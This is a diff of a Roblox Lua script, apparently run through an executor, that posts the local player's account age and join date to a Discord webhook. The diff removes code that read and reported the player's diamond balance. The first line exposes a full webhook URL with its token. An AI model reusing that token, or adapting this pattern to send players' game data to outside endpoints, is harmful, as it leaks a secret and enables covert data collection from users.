@@ -1,19 +1,7 @@
 local Webhook = "https://discord.com/api/webhooks/1279863563166548051/fkkcor2z5olcs7vw0Eods3E-VcCXkPqIcdk7XZT6W5p_wScD9FPaBKnT9gA_Hf1vMYIP" -- your webhook
 _G.Discord_UserID = "" -- ID To Ping on every execution, blank if no one wants to be pinged.
 
-local library = game.ReplicatedStorage.Library
-local save = require(library.Client.Save).Get().Inventory
-local GetSave = function()
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()
-end
 
-local GemAmount1 = 1
-for i, v in pairs(GetSave().Inventory.Currency) do
-    if v.id == "Diamonds" then
-        GemAmount1 = v._am
-		break
-    end
-end
 local player = game:GetService"Players".LocalPlayer
 local joinTime = os.time() - (player.AccountAge*86400)
 local joinDate = os.date("!*t", joinTime)
@@ -88,11 +76,6 @@ local msg = {
                 {
                    ["name"] = "Date Joined",
                    ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
-                   ["inline"] = true
-                },
-                {
-                   ["name"] = "Gem Amount",
-                   ["value"] = GemAmount1,
                    ["inline"] = true
                 },
                 {
